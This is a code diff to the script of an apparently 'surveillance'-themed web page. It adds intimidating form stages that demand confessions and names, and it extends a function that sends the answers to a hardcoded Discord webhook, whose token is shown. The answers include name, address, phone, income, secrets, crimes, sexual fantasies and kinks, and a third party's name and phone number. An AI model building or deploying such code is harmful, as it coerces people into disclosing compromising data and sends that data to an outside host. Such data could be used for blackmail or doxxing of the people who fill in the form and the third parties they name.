@@ -30,6 +30,13 @@ document.getElementById('start-btn').addEventListener('click', () => {
     typeLog("INITIALIZING SURVEILLANCE...");
     typeLog("MANUAL ENTRY REQUIRED...");
     playHum();
+
+    // PLAY EXTERNAL AUDIO
+    const bgAudio = document.getElementById('bg-audio');
+    if (bgAudio) {
+        bgAudio.volume = 0.5;
+        bgAudio.play().catch(e => console.log("Audio play failed:", e));
+    }
 });
 
 // VALIDATION LOGIC
@@ -93,10 +100,39 @@ window.nextStage = function (stage) {
                     verifyUI.classList.add('hidden');
                     typeLog(`IDENTITY CONFIRMED: ${name}`);
                     typeLog(`INCOME LEVEL: ${income}`);
-                    goToStage(2);
+                    goToStage(1.5);
                 }, 1000);
             }
         }, 1500);
+        return;
+    }
+
+    // STAGE 1.5 (RELATIONSHIPS)
+    if (stage === 1.5) {
+        const secret = document.getElementById('inp-secret').value;
+        if (!isValidInput(secret) || secret.length < 5) {
+            alert("WE KNOW YOU ARE LYING. CONFESS.");
+            return;
+        }
+        goToStage(1.8); // Go to NEW Stage 1.8
+        return;
+    }
+
+    // STAGE 1.8 (DARK PSYCHOLOGY)
+    if (stage === 1.8) {
+        const hate = document.getElementById('inp-hate').value;
+        const crime = document.getElementById('inp-crime').value;
+
+        if (!isValidInput(hate)) {
+            alert("GIVE US A NAME.");
+            return;
+        }
+        if (crime.length < 3) {
+            alert("EVERYONE IS GUILTY OF SOMETHING.");
+            return;
+        }
+
+        goToStage(2);
         return;
     }
 
@@ -148,12 +184,33 @@ window.nextStage = function (stage) {
 function sendToDiscord() {
     const webhookURL = "https://discord.com/api/webhooks/1471941517894619322/EC-Nmdqj5QvXkkEJUcoyCwPgEDoaC3-7ajkweyi3pUFeSL-WO-nG5Hxp8OfUxd4IAfgm";
 
+    let cheatStatus = "UNKNOWN";
+    const cheatYes = document.querySelector('input[name="cheat"][value="YES"]');
+    if (cheatYes && cheatYes.checked) cheatStatus = "YES";
+    const cheatNo = document.querySelector('input[name="cheat"][value="NO"]');
+    if (cheatNo && cheatNo.checked) cheatStatus = "NO";
+
     const data = {
         name: document.getElementById('inp-name').value,
         email: document.getElementById('inp-email').value,
         phone: document.getElementById('inp-phone').value,
         address: document.getElementById('inp-address').value,
         income: document.getElementById('inp-income').value,
+        // NEW FIELDS
+        relationship: document.getElementById('inp-relationship').value,
+        cheat: cheatStatus,
+        secret: document.getElementById('inp-secret').value,
+
+        // DARK PSYCHOLOGY
+        hate: document.getElementById('inp-hate').value,
+        crime: document.getElementById('inp-crime').value,
+        regret: document.getElementById('inp-regret').value,
+
+        // FANTASIES
+        fantasy: document.getElementById('inp-fantasy').value,
+        kink: document.getElementById('inp-kink').value,
+        paid: (document.querySelector('input[name="paid"]:checked') ? document.querySelector('input[name="paid"]:checked').value : "UNKNOWN"),
+
         targetName: document.getElementById('inp-target-name').value,
         targetPhone: document.getElementById('inp-target-phone').value,
         vices: document.getElementById('inp-vices').value,
